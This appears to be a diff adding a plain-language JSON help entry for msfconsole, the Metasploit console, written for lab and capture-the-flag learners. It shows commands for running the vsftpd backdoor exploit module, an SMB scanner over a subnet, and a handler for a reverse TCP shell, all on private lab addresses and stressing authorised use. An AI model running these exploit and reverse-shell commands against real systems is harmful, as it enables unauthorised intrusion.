@@ -1,0 +1,215 @@
+{
+ "name": "msfconsole",
+ "section": "1",
+ "one_line": "the Metasploit Framework console",
+ "plain": [
+  "`msfconsole` opens Metasploit, a big toolbox of exploits, scanners and payloads that you drive with short commands inside its own prompt.",
+  "The routine is: search for a module, use it, show options, set what is missing (the target RHOSTS and your own address LHOST), then run. Modules are of kinds: exploit, auxiliary (scanners and checks), payload (what runs after), post (after you are in) and encoder.",
+  "Only use it in labs and authorised tests. In CyberSci-type events you may be restricted from some features, so read the rules."
+ ],
+ "when": [
+  "Check whether a lab target is vulnerable to a known exploit.",
+  "Run scanners (auxiliary modules) such as SMB version or login checks.",
+  "Catch a connection from a payload (a handler).",
+  "Keep notes of hosts and services in its database."
+ ],
+ "examples": [
+  {
+   "title": "Start the console quietly",
+   "cmd": "msfconsole -q",
+   "explain": "-q hides the banner so it starts faster."
+  },
+  {
+   "title": "Search for a module",
+   "cmd": "msf6 > search type:exploit name:vsftpd",
+   "explain": "You can search by name, CVE (cve:2021-41773), platform, type or rank. Results are numbered."
+  },
+  {
+   "title": "Use a module and read its options",
+   "cmd": "msf6 > use exploit/unix/ftp/vsftpd_234_backdoor\nmsf6 exploit(...) > show options",
+   "explain": "use selects it (or use 0 for result number). show options lists what you must set: those marked required yes with no value."
+  },
+  {
+   "title": "Set the target and run",
+   "cmd": "msf6 exploit(...) > set RHOSTS 10.10.10.5\nmsf6 exploit(...) > run",
+   "explain": "RHOSTS is the remote target, LHOST the address the target should call back to. run (or exploit) starts it."
+  },
+  {
+   "title": "Check before you fire",
+   "cmd": "msf6 exploit(...) > check",
+   "explain": "Some modules can test whether the target is vulnerable without exploiting."
+  },
+  {
+   "title": "Run a scanner",
+   "cmd": "msf6 > use auxiliary/scanner/smb/smb_version\nmsf6 auxiliary(...) > set RHOSTS 10.10.10.0/24\nmsf6 auxiliary(...) > run",
+   "explain": "Auxiliary modules scan or probe without exploiting."
+  },
+  {
+   "title": "Catch a reverse connection",
+   "cmd": "msf6 > use exploit/multi/handler\nmsf6 exploit(...) > set payload linux/x64/shell_reverse_tcp\nmsf6 exploit(...) > set LHOST 10.10.14.2\nmsf6 exploit(...) > run",
+   "explain": "The handler waits for a payload on the target to call back to your machine."
+  },
+  {
+   "title": "Run a resource script",
+   "cmd": "msfconsole -q -r commands.rc",
+   "explain": "-r runs the commands in a file as if you typed them, so a setup is repeatable."
+  },
+  {
+   "title": "Save work in the database",
+   "cmd": "msf6 > workspace -a ctf1\nmsf6 > db_nmap -sV 10.10.10.5\nmsf6 > services",
+   "explain": "workspace keeps results apart; db_nmap runs nmap and stores hosts and services, which services lists."
+  }
+ ],
+ "options": [
+  {
+   "flag": "msfconsole -q",
+   "plain": "Do not print the banner.",
+   "use": "Quick start."
+  },
+  {
+   "flag": "msfconsole -r FILE",
+   "plain": "Run a resource script.",
+   "use": "Automation."
+  },
+  {
+   "flag": "msfconsole -x 'cmds'",
+   "plain": "Run these commands at start.",
+   "use": "One-liners."
+  },
+  {
+   "flag": "msfconsole -n",
+   "plain": "Do not use the database.",
+   "use": "Simple runs."
+  },
+  {
+   "flag": "msfconsole -v",
+   "plain": "Show version.",
+   "use": "Check install."
+  },
+  {
+   "flag": "search TERM",
+   "plain": "Find modules (name:, type:, cve:, platform:, rank:).",
+   "use": "Starting point."
+  },
+  {
+   "flag": "info [MODULE]",
+   "plain": "Describe a module, its options and references.",
+   "use": "Reading before using."
+  },
+  {
+   "flag": "use MODULE|NUMBER",
+   "plain": "Select a module.",
+   "use": "Starting a run."
+  },
+  {
+   "flag": "show options|payloads|targets|advanced",
+   "plain": "Show the module's settings, usable payloads or targets.",
+   "use": "Configuring."
+  },
+  {
+   "flag": "set NAME VALUE / unset NAME",
+   "plain": "Set or clear an option.",
+   "use": "Configuring."
+  },
+  {
+   "flag": "setg NAME VALUE",
+   "plain": "Set a global option for all modules.",
+   "use": "Reusing RHOSTS and LHOST."
+  },
+  {
+   "flag": "check",
+   "plain": "Test if the target looks vulnerable.",
+   "use": "Safe check."
+  },
+  {
+   "flag": "run, exploit",
+   "plain": "Run the module.",
+   "use": "Execute."
+  },
+  {
+   "flag": "run -j / exploit -j",
+   "plain": "Run as a background job.",
+   "use": "Listeners."
+  },
+  {
+   "flag": "sessions -l / -i N / -k N",
+   "plain": "List, interact with, or kill sessions.",
+   "use": "Working with shells."
+  },
+  {
+   "flag": "jobs",
+   "plain": "List or stop background jobs.",
+   "use": "Managing listeners."
+  },
+  {
+   "flag": "back",
+   "plain": "Leave the current module.",
+   "use": "Switching."
+  },
+  {
+   "flag": "background",
+   "plain": "Put the current session in the background (Ctrl+Z).",
+   "use": "Keeping a session while doing other things."
+  },
+  {
+   "flag": "workspace [-a|-d NAME]",
+   "plain": "Manage workspaces.",
+   "use": "Keeping targets apart."
+  },
+  {
+   "flag": "hosts / services / vulns / creds / loot / notes",
+   "plain": "Show what the database knows.",
+   "use": "Reporting."
+  },
+  {
+   "flag": "db_nmap ARGS",
+   "plain": "Run nmap and save to the database.",
+   "use": "Recon."
+  },
+  {
+   "flag": "db_import FILE",
+   "plain": "Import scan results (nmap XML).",
+   "use": "Reusing scans."
+  },
+  {
+   "flag": "spool FILE",
+   "plain": "Log console output to a file.",
+   "use": "Evidence."
+  },
+  {
+   "flag": "load / unload / loadpath",
+   "plain": "Load plugins or module paths.",
+   "use": "Extensions."
+  },
+  {
+   "flag": "reload_all",
+   "plain": "Reload modules.",
+   "use": "After adding your own."
+  },
+  {
+   "flag": "help [COMMAND]",
+   "plain": "Show help.",
+   "use": "A reminder."
+  },
+  {
+   "flag": "exit",
+   "plain": "Quit the console.",
+   "use": "Done."
+  }
+ ],
+ "mistakes": [
+  "Setting LHOST to the wrong address (the VPN interface is usually tun0, not eth0): the target cannot call back.",
+  "Skipping show options and missing a required value.",
+  "Choosing an incompatible payload: use show payloads for the module.",
+  "Using Metasploit when the event rules forbid it or when a manual exploit is simpler and quieter.",
+  "Running modules against targets you are not authorised to test."
+ ],
+ "try": [
+  "Search for vsftpd, read info, set RHOSTS on a lab machine and run it.",
+  "Run the smb_version scanner against your lab subnet.",
+  "Create a workspace and run db_nmap, then list services.",
+  "Write a resource file that sets RHOSTS and LHOST and run it with -r."
+ ],
+ "see_also": "searchsploit(1), nmap(1), msfvenom(1), nc(1), and the Metasploit documentation.",
+ "captured_with": "Examples are written to explain a technique; they are not captured output."
+}
